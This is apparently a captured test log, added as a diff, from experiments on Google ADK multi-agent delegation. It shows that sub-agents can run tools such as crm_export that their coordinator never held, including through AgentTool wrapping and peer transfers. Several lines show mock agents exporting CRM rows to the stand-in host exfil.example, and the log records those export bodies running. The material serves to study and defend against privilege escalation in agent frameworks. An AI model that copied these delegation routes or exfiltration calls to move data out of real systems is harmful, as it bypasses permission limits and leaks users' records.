@@ -1,0 +1,80 @@
+# stdout only. ADK's own stderr logging (deprecation warnings and an internal
+# traceback for the Experiment B tool-not-found) is omitted; the ValueError it
+# raises is caught and printed below under Experiment B.
+
+date (UTC)  : 2026-09-02
+python      : 3.12.12
+google-adk  : 2.7.1
+google-genai: 2.18.1
+attenu-guard: NOT IMPORTED (baseline is the framework alone)
+
+==========================================================================
+EXPERIMENT A — parent {crm_query}; sub-agent {crm_query, crm_export}
+==========================================================================
+    [coordinator] -> calls transfer_to_agent({'agent_name': 'specialist'})
+    [coordinator] <- transfer_to_agent: {'result': None}
+    [specialist] -> calls crm_query({'rows': 50})
+    [specialist] <- crm_query: {'rows_returned': 50}
+    [specialist] -> calls crm_export({'destination': 'https://exfil.example/drop'})
+    [specialist] <- crm_export: {'exported_to': 'https://exfil.example/drop'}
+    [specialist] says: Done.
+
+  tools offered to coordinator : ['crm_query', 'transfer_to_agent']
+  tools offered to specialist  : ['crm_export', 'crm_query', 'transfer_to_agent']
+  tool bodies that RAN         : [('crm_query', 50), ('crm_export', 'https://exfil.example/drop')]
+
+  crm_export body ran? True
+  => the sub-agent held a tool the parent never held, and it EXECUTED.
+
+==========================================================================
+EXPERIMENT B — parent {crm_query}; sub-agent declares NO tools
+==========================================================================
+    [coordinator] -> calls transfer_to_agent({'agent_name': 'bare'})
+    [coordinator] <- transfer_to_agent: {'result': None}
+    [bare] -> calls crm_query({'rows': 7})
+    ADK raised: ValueError: Tool 'crm_query' not found.
+Available tools: transfer_to_agent
+
+Possible causes:
+  1. LLM hallucinated the function name - review agent instruction clarity
+  2. Tool not registered - verify agent.tools list
+  3. Name mismatch - check for typos
+
+Suggested fixes:
+  - Review agent instruction to ensure tool usage is clear
+  - Verify tool is included in agent.tools list
+  - Check for typos in function name
+
+  tools offered to coordinator : ['crm_query', 'transfer_to_agent']
+  tools offered to bare        : ['transfer_to_agent']
+  tool bodies that RAN         : []
+
+  did 'bare' inherit the parent's crm_query? False
+
+==========================================================================
+EXPERIMENT C — AgentTool: parent {crm_query, AgentTool(exporter)}; exporter holds crm_export
+==========================================================================
+    [coordinator] -> calls exporter({'request': 'ship the data'})
+    [coordinator] <- exporter: {'result': 'Exported.'}
+    [coordinator] says: Done.
+
+  tools offered to coordinator : ['crm_query', 'exporter']
+  tools offered to exporter    : ['crm_export']
+  tool bodies that RAN         : [('crm_export', 'https://exfil.example/drop')]
+
+  crm_export body ran under the parent's turn? True
+
+==========================================================================
+EXPERIMENT D — what disallow_transfer_to_peers actually blocks
+==========================================================================
+    [coordinator] -> calls transfer_to_agent({'agent_name': 'a_agent'})
+    [coordinator] <- transfer_to_agent: {'result': None}
+    [a_agent] -> calls transfer_to_agent({'agent_name': 'b_agent'})
+    [a_agent] <- transfer_to_agent: {'result': None}
+    [b_agent] -> calls crm_export({'destination': 'https://exfil.example/drop'})
+    [b_agent] <- crm_export: {'exported_to': 'https://exfil.example/drop'}
+    [b_agent] says: Done.
+
+  tools offered to a_agent : ['crm_query', 'transfer_to_agent']
+  tool bodies that RAN     : [('crm_export', 'https://exfil.example/drop')]
+  => disallow_transfer_to_peers removes the transfer TARGET, not any tool authority.
